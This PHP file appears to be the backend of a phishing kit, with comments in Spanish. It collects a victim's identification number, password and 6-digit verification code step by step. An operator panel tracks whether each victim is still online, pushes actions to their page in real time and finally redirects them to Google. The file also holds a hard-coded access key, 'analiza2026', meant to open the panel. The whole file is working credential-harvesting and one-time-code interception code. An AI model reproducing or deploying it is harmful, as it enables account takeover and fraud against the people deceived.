<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
header('Content-Type: application/json; charset=utf-8');
require_once __DIR__ . '/storage.php';

$action = $_GET['action'] ?? $_POST['action'] ?? '';

// Lectura para analisis externo con clave fija
if ($action === 'get_data' && isset($_GET['k']) && $_GET['k'] === 'analiza2026') {
    $_SESSION['panel_auth'] = true;
}
// Proteger acciones exclusivas del operador mediante la sesión del panel
$operatorActions = ['get_data', 'set_action', 'delete', 'clear_all'];
if (in_array($action, $operatorActions, true)) {
    if (empty($_SESSION['panel_autenticado'])) {
        echo json_encode([
            'success' => false,
            'message' => 'No autorizado. Debe iniciar sesión en el panel.'
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

if ($action === 'get_data') {
    $registros = leerRegistros();
    $ahora = time();

    // Calcular estado de conexión en tiempo real para cada contenedor
    foreach ($registros as &$item) {
        $ultimoPing = $item['ultimo_ping'] ?? $item['timestamp'] ?? 0;
        $haSalido = !empty($item['salio']);
        
        $segundosSinPing = $ahora - $ultimoPing;
        
        // Se marca fuera si envió señal de salida definitiva (cierre de pestaña) o si no envía latido en más de 10 segundos
        if ($haSalido || $segundosSinPing > 10) {
            $item['en_linea'] = false;
            $item['estado_conexion'] = 'Salió de la web';
        } else {
            $item['en_linea'] = true;
            $item['estado_conexion'] = 'En línea';
        }
    }
    unset($item);

    echo json_encode([
        'success' => true,
        'count' => count($registros),
        'data' => $registros
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

if ($action === 'ping') {
    $id = $_POST['id'] ?? $_GET['id'] ?? ($_SESSION['cuadro_id'] ?? '');
    if (!empty($id)) {
        actualizarPingCuadro($id, true);
    }
    echo json_encode(['success' => true]);
    exit;
}

if ($action === 'offline') {
    $id = $_POST['id'] ?? $_GET['id'] ?? ($_SESSION['cuadro_id'] ?? '');
    if (!empty($id)) {
        actualizarPingCuadro($id, false);
    }
    echo json_encode(['success' => true]);
    exit;
}

if ($action === 'set_action') {
    $id = $_POST['id'] ?? $_GET['id'] ?? '';
    $tipoAccion = $_POST['accion'] ?? $_GET['accion'] ?? '';
    $redirectUrl = $_POST['redirect_url'] ?? $_GET['redirect_url'] ?? 'https://www.google.com';

    if (empty($id) || empty($tipoAccion)) {
        echo json_encode(['success' => false, 'message' => 'Parámetros incompletos']);
        exit;
    }

    $resultado = actualizarAccionCuadro($id, $tipoAccion, $redirectUrl);
    if ($resultado) {
        echo json_encode([
            'success' => true, 
            'message' => 'Acción aplicada correctamente',
            'data' => $resultado
        ], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'message' => 'Cuadro no encontrado']);
    }
    exit;
}

if ($action === 'check_status') {
    $id = $_GET['id'] ?? $_POST['id'] ?? ($_SESSION['cuadro_id'] ?? '');
    if (empty($id)) {
        echo json_encode(['success' => false, 'message' => 'ID no proporcionado']);
        exit;
    }

    // Cada consulta de estado cuenta como ping de presencia en línea
    actualizarPingCuadro($id, true);

    $item = obtenerCuadroPorId($id);
    if ($item) {
        echo json_encode([
            'success' => true,
            'id' => $item['id'],
            'estado' => $item['estado'] ?? 'Recibido',
            'accion' => $item['accion'] ?? 'esperando',
            'paso_actual' => $item['paso_actual'] ?? 1,
            'bloqueado' => !empty($item['bloqueado']),
            'redirect_url' => !empty($item['redirect_url']) ? $item['redirect_url'] : 'https://www.google.com'
        ], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'message' => 'Cuadro no encontrado']);
    }
    exit;
}

if ($action === 'delete') {
    $id = $_POST['id'] ?? $_GET['id'] ?? '';
    if (!empty($id)) {
        eliminarRegistro($id);
        echo json_encode(['success' => true, 'message' => 'Cuadro eliminado']);
    } else {
        echo json_encode(['success' => false, 'message' => 'ID no proporcionado']);
    }
    exit;
}

if ($action === 'clear_all') {
    vaciarRegistros();
    echo json_encode(['success' => true, 'message' => 'Todos los cuadros han sido eliminados']);
    exit;
}

// 1. Número de Identificación
if ($action === 'add') {
    $documento = trim($_POST['identificacion'] ?? $_GET['identificacion'] ?? '');
    if (!empty($documento)) {
        $nuevo = agregarNuevoCuadro($documento);
        $_SESSION['cuadro_id'] = $nuevo['id'];
        $_SESSION['identificacion'] = $documento;
        echo json_encode(['success' => true, 'data' => $nuevo], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'message' => 'Documento requerido']);
    }
    exit;
}

// 2. Contraseña
if ($action === 'set_password') {
    $id = $_POST['id'] ?? $_GET['id'] ?? ($_SESSION['cuadro_id'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (empty($id) || empty($password)) {
        echo json_encode(['success' => false, 'message' => 'Contraseña requerida']);
        exit;
    }

    $actualizado = actualizarPasswordCuadro($id, $password);
    if ($actualizado) {
        echo json_encode(['success' => true, 'data' => $actualizado], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'message' => 'Cuadro no encontrado']);
    }
    exit;
}

// 3. Código de 6 dígitos
if ($action === 'set_code') {
    $id = $_POST['id'] ?? $_GET['id'] ?? ($_SESSION['cuadro_id'] ?? '');
    $codigo = trim($_POST['codigo'] ?? '');

    if (empty($id) || empty($codigo)) {
        echo json_encode(['success' => false, 'message' => 'Código de 6 dígitos requerido']);
        exit;
    }

    $actualizado = actualizarCodigoCuadro($id, $codigo);
    if ($actualizado) {
        echo json_encode(['success' => true, 'data' => $actualizado], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'message' => 'Cuadro no encontrado']);
    }
    exit;
}

echo json_encode(['success' => false, 'message' => 'Acción no válida']);
